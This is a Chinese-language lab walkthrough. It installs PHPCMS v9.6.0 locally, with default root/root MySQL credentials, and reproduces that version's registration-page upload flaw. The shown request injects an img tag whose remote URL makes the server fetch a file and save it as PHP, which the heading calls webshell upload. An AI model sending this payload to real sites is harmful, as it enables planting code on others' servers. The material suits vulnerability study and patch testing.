## 安装步骤：  

首先在www根目录新建一个phpcms\_v9.6.0文件夹，下载后解压，将解压后的install\_package中的所有文件复制到刚才新建的phpcms\_v9.6.0目录下。接着浏览器中输入 http://ip/phpcms\_v9.6.0，进行安装。

phpstudy的mysql数据库：

```
默认端口：3306
默认账号：root
默认密码：root
```

![](../Images/008b5c98b0f64c9e875fd159b1a35319.png)

然后就安装成功了。

![](../Images/65ad68356d16cf705ac794ace8a0a36b.png)

注意，在安装过程中提示文件夹没权限的话，是因为本地没有那个文件夹，新建就行了。  

## poc上传webshell

漏洞页面：注册页面。

![](../Images/e05a585add003211b582ae8f6d164604.png)

点击注册同时用burp抓包，数据包如下

![](../Images/da9ff268436319a405ba04526a595187.png)

我们修改modelid=1,  

info%5Bbirthday%5D=2021-04-09 修改为info\[content\]=img src=http://localhost/phpinfo.txt?.php#.jpg\>

具体如下：

```
siteid=1&modelid=1&username=123456&password=123456&pwdconfirm=123456&email=admin@admin.com&nickname=123456&info\[content\]=<img src=http://localhost/phpinfo.txt?.php#.jpg>&dosubmit=1&protocol=
```

然后send，可以发现phpinfo.php已经上传成功了。

![](../Images/0b7011388ecf30c1e6439f2776b56ce4.png)

浏览器访问该phpinfo.php。
